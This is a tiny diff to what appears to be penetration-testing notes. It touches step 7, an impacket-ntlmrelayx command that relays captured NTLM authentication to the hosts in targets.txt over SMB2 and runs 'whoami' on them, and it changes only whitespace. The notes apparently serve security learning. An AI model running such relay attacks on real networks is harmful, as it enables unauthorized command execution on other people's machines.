@@ -88,7 +88,8 @@ Once netcat has been binded to list all the available arguments that is availabl
 
 7. Using command switch with impacket. 
 
-            impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
+            impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"  
+
 ------- 
 **Reference:**  
 
